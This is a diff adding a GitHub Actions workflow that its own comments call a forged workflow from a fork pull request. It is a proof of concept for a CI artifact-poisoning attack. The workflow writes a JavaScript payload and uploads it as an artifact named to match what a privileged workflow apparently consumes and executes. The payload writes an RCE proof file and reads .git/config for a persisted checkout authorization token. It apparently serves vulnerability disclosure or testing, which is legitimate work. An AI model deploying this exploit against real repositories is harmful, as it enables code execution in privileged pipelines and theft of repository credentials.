@@ -1,0 +1,33 @@
+name: Eval Upstream POC-ART
+
+# Forged workflow: an unprivileged fork PR contributor can add this file.
+# Its `name:` matches the workflow the privileged report workflow watches.
+on: pull_request
+
+permissions:
+  contents: read
+
+jobs:
+  evaluate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft payload
+        run: |
+          mkdir -p evals/results
+          cat > evals/results/generate-compare-json.js <<'JS'
+          const fs = require("fs");
+          console.log("PWNED_FROM_FORK_PR job=" + process.env.GITHUB_JOB);
+          fs.writeFileSync("rce-proof.txt", "attacker code from fork PR executed in privileged workflow\n");
+          try {
+            const cfg = fs.readFileSync(".git/config", "utf8");
+            const m = cfg.match(/AUTHORIZATION: basic (\S+)/i);
+            console.log("PERSISTED_CHECKOUT_TOKEN=" + (m ? "yes" : "no"));
+          } catch (e) {
+            console.log("CONFIG_READ_ERROR=" + e.message);
+          }
+          JS
+      - name: Upload eval results artifact
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: skill-eval-raw
+          path: evals/results/generate-compare-json.js
